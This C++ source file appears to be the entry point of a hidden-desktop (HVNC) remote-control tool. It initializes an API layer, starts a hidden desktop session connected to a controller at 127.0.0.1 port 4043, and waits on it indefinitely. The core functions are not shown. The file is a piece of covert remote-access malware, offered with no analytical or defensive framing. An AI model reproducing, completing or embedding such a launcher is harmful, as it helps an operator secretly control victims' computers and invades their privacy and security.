#include "HiddenDesktop.h"

#define TIMEOUT INFINITE

void StartAndWait(const char *host, int port)
{
    InitApi();
    const HANDLE hThread = StartHiddenDesktop(host, port);
    WaitForSingleObject(hThread, TIMEOUT);
}

#if 1
int main()
{
    const char* host = "127.0.0.1";
    const int port = strtol("4043", nullptr, 10);
    StartAndWait(host, port);
    return 0;
}
#endif